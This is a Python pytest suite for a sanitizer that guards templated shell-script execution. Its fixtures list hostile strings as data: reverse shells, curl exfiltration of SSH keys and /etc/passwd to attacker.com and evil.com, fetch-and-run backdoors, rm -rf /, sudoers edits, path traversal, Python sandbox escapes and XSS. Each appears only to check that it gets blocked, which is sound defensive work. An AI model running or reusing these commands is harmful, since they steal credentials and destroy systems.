#!/usr/bin/env python3
"""
Comprehensive Security Tests for Pattern Safety Framework
Tests all security measures and validates protection against attacks.

Created for: Christian
Test Priority: CRITICAL
"""

import pytest
import os
import sys
import tempfile
import json
from pathlib import Path
from typing import Dict, List, Any

# Add project root to path
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from security.immediate_security_fixes import ImmediateSecurityPatch, SecurityError

class TestPatternSafety:
    """Comprehensive security tests for pattern execution"""
    
    def setup_method(self):
        """Setup for each test"""
        self.security_patch = ImmediateSecurityPatch()
        self.temp_dir = Path(tempfile.mkdtemp())
    
    def teardown_method(self):
        """Cleanup after each test"""
        import shutil
        if self.temp_dir.exists():
            shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    # CRITICAL SECURITY TESTS
    
    def test_command_injection_prevention(self):
        """Test prevention of command injection attacks"""
        malicious_inputs = [
            "; rm -rf /",
            "| nc attacker.com 1234",
            "&& wget http://evil.com/malware",
            "$(rm -rf /)",
            "`rm -rf /`",
            "'; DROP TABLE users; --",
            "test || cat /etc/passwd",
            "test; curl evil.com/exfiltrate -d $(cat ~/.ssh/id_rsa)",
            "innocent & (curl attacker.com/backdoor | sh)"
        ]
        
        for malicious_input in malicious_inputs:
            with pytest.raises(SecurityError):
                self.security_patch.sanitize_template_variables({
                    "USER_INPUT": malicious_input
                })
    
    def test_path_traversal_prevention(self):
        """Test prevention of path traversal attacks"""
        traversal_attempts = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\SAM",
            "../../../../etc/shadow",
            "~/../../etc/passwd",
            "/etc/passwd",
            "/proc/self/environ",
            "/sys/class/net/eth0/address",
            "file:///etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        ]
        
        for traversal_path in traversal_attempts:
            with pytest.raises(SecurityError):
                self.security_patch.sanitize_template_variables({
                    "FILE_PATH": traversal_path
                })
    
    def test_code_execution_prevention(self):
        """Test prevention of arbitrary code execution"""
        code_execution_attempts = [
            "eval('__import__(\"os\").system(\"rm -rf /\")')",
            "exec(open('/etc/passwd').read())",
            "__import__('subprocess').call(['rm', '-rf', '/'])",
            "compile('print(\"pwned\")', '<string>', 'exec')",
            "globals()['__builtins__']['eval']('1+1')",
            "locals()['__builtins__']['__import__']('os')",
            "getattr(__builtins__, 'eval')('1+1')",
            "().__class__.__bases__[0].__subclasses__()[104].__init__.__globals__['sys'].exit()"
        ]
        
        for code_attempt in code_execution_attempts:
            with pytest.raises(SecurityError):
                self.security_patch.sanitize_template_variables({
                    "CODE": code_attempt
                })
    
    def test_privilege_escalation_prevention(self):
        """Test prevention of privilege escalation attempts"""
        escalation_attempts = [
            "sudo rm -rf /",
            "su root",
            "passwd root",
            "useradd attacker",
            "chmod 777 /etc/passwd",
            "chown root:root malicious_file",
            "mount /dev/sda1 /mnt",
            "systemctl start backdoor.service",
            "crontab -e",
            "echo 'attacker ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers"
        ]
        
        for escalation_attempt in escalation_attempts:
            with pytest.raises(SecurityError):
                self.security_patch.sanitize_template_variables({
                    "COMMAND": escalation_attempt
                })
    
    def test_network_attack_prevention(self):
        """Test prevention of network-based attacks"""
        network_attacks = [
            "nc -l -p 1234 -e /bin/bash",
            "wget http://attacker.com/malware",
            "curl http://evil.com/data -d @/etc/passwd",
            "telnet attacker.com 1234",
            "ssh user@attacker.com",
            "scp /etc/passwd user@attacker.com:",
            "rsync -av / user@attacker.com:",
            "netcat -e /bin/sh attacker.com 1234",
            "socat tcp-connect:attacker.com:1234 exec:/bin/bash"
        ]
        
        for network_attack in network_attacks:
            with pytest.raises(SecurityError):
                self.security_patch.sanitize_template_variables({
                    "NETWORK_CMD": network_attack
                })
    
    def test_data_exfiltration_prevention(self):
        """Test prevention of data exfiltration attempts"""
        exfiltration_attempts = [
            "base64 /etc/passwd | curl -d @- http://attacker.com",
            "tar czf - /home | nc attacker.com 1234",
            "cat ~/.ssh/id_rsa | xxd | curl -d @- evil.com",
            "find / -name '*.key' -exec cat {} \\; | curl -d @- attacker.com",
            "grep -r password /etc | base64 | wget --post-data=@- evil.com",
            "dd if=/dev/sda | gzip | nc attacker.com 1234",
            "cat /proc/version /etc/issue | curl -d @- evil.com/info"
        ]
        
        for exfil_attempt in exfiltration_attempts:
            with pytest.raises(SecurityError):
                self.security_patch.sanitize_template_variables({
                    "EXFIL_CMD": exfil_attempt
                })
    
    def test_resource_exhaustion_prevention(self):
        """Test prevention of resource exhaustion attacks"""
        # Test variable length limits
        long_variable = "A" * 10000
        with pytest.raises(SecurityError):
            self.security_patch.sanitize_template_variables({
                "LONG_VAR": long_variable
            })
        
        # Test acceptable length
        normal_variable = "A" * 500
        result = self.security_patch.sanitize_template_variables({
            "NORMAL_VAR": normal_variable
        })
        assert "NORMAL_VAR" in result
        assert result["NORMAL_VAR"] == normal_variable
    
    def test_null_byte_injection_prevention(self):
        """Test prevention of null byte injection"""
        null_byte_attempts = [
            "innocent\x00; rm -rf /",
            "file.txt\x00.exe",
            "normal_text\x00malicious_code",
            "\x00\x00\x00malicious",
            "path/to/file\x00../../../etc/passwd"
        ]
        
        for null_attempt in null_byte_attempts:
            result = self.security_patch.sanitize_template_variables({
                "NULL_TEST": null_attempt
            })
            assert "\x00" not in result["NULL_TEST"]
    
    def test_script_injection_prevention(self):
        """Test prevention of script injection in templates"""
        script_injections = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "vbscript:msgbox('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "onload=alert('XSS')",
            "<iframe src=javascript:alert('XSS')></iframe>"
        ]
        
        for script_injection in script_injections:
            with pytest.raises(SecurityError):
                self.security_patch.validate_template_content(script_injection)
    
    def test_command_whitelist_enforcement(self):
        """Test that only whitelisted commands are allowed"""
        # Test allowed commands
        allowed_commands = [
            "echo hello",
            "ls -la",
            "cat file.txt",
            "grep pattern file",
            "git status"
        ]
        
        for command in allowed_commands:
            assert self.security_patch.validate_command(command) == True
        
        # Test blocked commands
        blocked_commands = [
            "sudo ls",
            "su root",
            "wget http://evil.com",
            "nc -l 1234",
            "rm -rf /",
            "fdisk /dev/sda",
            "mount /dev/sda1",
            "iptables -F"
        ]
        
        for command in blocked_commands:
            assert self.security_patch.validate_command(command) == False
    
    def test_safe_variable_substitution(self):
        """Test safe variable substitution"""
        template = "echo 'Hello [NAME], your file is [FILE]'"
        variables = {
            "NAME": "Christian",
            "FILE": "document.txt"
        }
        
        result = self.security_patch.secure_substitute_variables(template, variables)
        assert "Christian" in result
        assert "document.txt" in result
        assert "[NAME]" not in result
        assert "[FILE]" not in result
    
    def test_dangerous_variable_substitution_blocked(self):
        """Test that dangerous variable substitution is blocked"""
        template = "echo 'Processing [INPUT]'"
        dangerous_variables = {
            "INPUT": "'; rm -rf /; echo '"
        }
        
        with pytest.raises(SecurityError):
            self.security_patch.secure_substitute_variables(template, dangerous_variables)
    
    def test_secure_script_creation(self):
        """Test secure script creation"""
        safe_template = """
echo "Starting process"
date
echo "Process complete"
"""
        
        script_path = self.security_patch.secure_create_execution_script(safe_template)
        assert script_path is not None
        assert script_path.exists()
        assert script_path.is_file()
        
        # Check script permissions
        stat = script_path.stat()
        assert stat.st_mode & 0o777 == 0o700  # Owner read/write/execute only
        
        # Check script content
        content = script_path.read_text()
        assert "set -euo pipefail" in content  # Strict error handling
        assert "ulimit" in content  # Resource limits
        assert safe_template in content
    
    def test_script_execution_with_timeout(self):
        """Test script execution with timeout enforcement"""
        # Create a script that would run too long
        long_running_template = "sleep 400"  # 400 seconds, exceeds 300s limit
        
        script_path = self.security_patch.secure_create_execution_script(long_running_template)
        result = self.security_patch.secure_execute_script(script_path, self.temp_dir)
        
        assert result["success"] == False
        assert "timeout" in result["error"].lower()
    
    def test_script_execution_environment_isolation(self):
        """Test that script execution is properly isolated"""
        test_template = """
echo "PATH: $PATH"
echo "HOME: $HOME"
echo "USER: $USER"
env | sort
"""
        
        script_path = self.security_patch.secure_create_execution_script(test_template)
        result = self.security_patch.secure_execute_script(script_path, self.temp_dir)
        
        assert result["success"] == True
        output = result["output"]
        
        # Check restricted PATH
        assert "/usr/local/bin:/usr/bin:/bin" in output
        # Check restricted environment
        assert "HOME:" in output
        assert "USER: claude_executor" in output
    
    def test_working_directory_validation(self):
        """Test working directory validation"""
        # Test with non-existent directory
        fake_dir = Path("/nonexistent/directory")
        test_template = "echo 'test'"
        
        script_path = self.security_patch.secure_create_execution_script(test_template)
        result = self.security_patch.secure_execute_script(script_path, fake_dir)
        
        assert result["success"] == False
        assert "Invalid project root" in result["error"]
    
    def test_shell_metacharacter_sanitization(self):
        """Test sanitization of shell metacharacters"""
        dangerous_chars = ['`', '$', ';', '|', '&', '>', '<', '(', ')', '{', '}']
        
        for char in dangerous_chars:
            test_input = f"innocent{char}malicious"
            result = self.security_patch.sanitize_template_variables({
                "TEST": test_input
            })
            assert char not in result["TEST"]
    
    def test_complex_attack_scenarios(self):
        """Test complex, multi-vector attack scenarios"""
        complex_attacks = [
            # Mixed injection attack
            "normal_text'; (curl http://evil.com/$(cat /etc/passwd | base64) & echo 'done",
            
            # Encoded attack
            "echo 'hello' && echo -e '\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64' | xxd -r -p | head",
            
            # Obfuscated command injection
            "test || { echo 'found'; } && $(echo 'curl evil.com' | tr ' ' '\\n' | head -1) $(echo 'evil.com' | head -1)",
            
            # Path traversal with command injection
            "../../../../bin/sh -c 'curl http://attacker.com/$(whoami)'",
            
            # Resource exhaustion with data exfiltration
            "yes 'A' | head -c 1000000000 > /tmp/big && curl -T /tmp/big evil.com"
        ]
        
        for attack in complex_attacks:
            with pytest.raises(SecurityError):
                self.security_patch.sanitize_template_variables({
                    "COMPLEX_ATTACK": attack
                })
    
    def test_edge_cases(self):
        """Test edge cases and boundary conditions"""
        # Empty inputs
        result = self.security_patch.sanitize_template_variables({})
        assert result == {}
        
        result = self.security_patch.sanitize_template_variables({"EMPTY": ""})
        assert result["EMPTY"] == ""
        
        # None values
        result = self.security_patch.sanitize_template_variables({"NONE": None})
        assert result["NONE"] == "None"
        
        # Numeric values
        result = self.security_patch.sanitize_template_variables({"NUMBER": 12345})
        assert result["NUMBER"] == "12345"
        
        # Unicode characters
        result = self.security_patch.sanitize_template_variables({"UNICODE": "Hello 世界"})
        assert result["UNICODE"] == "Hello 世界"
    
    def test_security_logging(self):
        """Test that security violations are properly logged"""
        # This test checks that security events are logged
        # In a real implementation, you would check log files
        
        try:
            self.security_patch.sanitize_template_variables({
                "MALICIOUS": "; rm -rf /"
            })
            pytest.fail("Should have raised SecurityError")
        except SecurityError:
            # Security violation should be logged
            # In real implementation, check security.log file
            pass


class TestSecurityIntegration:
    """Integration tests for security framework"""
    
    def test_end_to_end_security_protection(self):
        """Test complete end-to-end security protection"""
        security_patch = ImmediateSecurityPatch()
        
        # Simulate a complete pattern execution with malicious content
        malicious_template = """
echo "Starting backup of [BACKUP_SOURCE]"
# This looks innocent but contains injection
tar czf backup.tar.gz [BACKUP_SOURCE]
echo "Backup complete"
"""
        
        malicious_variables = {
            "BACKUP_SOURCE": "/home/user'; curl http://attacker.com/exfiltrate -d @/etc/passwd; echo '"
        }
        
        # This should be completely blocked
        with pytest.raises(SecurityError):
            result = security_patch.secure_substitute_variables(malicious_template, malicious_variables)
    
    def test_legitimate_pattern_execution(self):
        """Test that legitimate patterns work correctly"""
        security_patch = ImmediateSecurityPatch()
        
        legitimate_template = """
echo "Hello [USER_NAME]"
echo "Current date: [TIMESTAMP]"
echo "Working in: [PROJECT_DIR]"
"""
        
        legitimate_variables = {
            "USER_NAME": "Christian",
            "TIMESTAMP": "2024-01-01T12:00:00Z",
            "PROJECT_DIR": "/home/christian/projects/claude"
        }
        
        # This should work fine
        result = security_patch.secure_substitute_variables(legitimate_template, legitimate_variables)
        assert "Christian" in result
        assert "2024-01-01T12:00:00Z" in result
        assert "/home/christian/projects/claude" in result


def run_security_tests():
    """Run all security tests"""
    print("🔒 RUNNING CRITICAL SECURITY TESTS")
    print("=" * 50)
    print("User: Christian")
    print("Test Suite: Pattern Safety Framework")
    print("Priority: CRITICAL")
    print()
    
    # Run pytest with verbose output
    exit_code = pytest.main([
        __file__,
        "-v",
        "--tb=short",
        "--color=yes"
    ])
    
    if exit_code == 0:
        print("\n✅ ALL SECURITY TESTS PASSED")
        print("Pattern execution framework is secure")
    else:
        print("\n❌ SECURITY TESTS FAILED")
        print("CRITICAL: Do not use pattern execution until issues are resolved")
    
    return exit_code


if __name__ == "__main__":
    run_security_tests()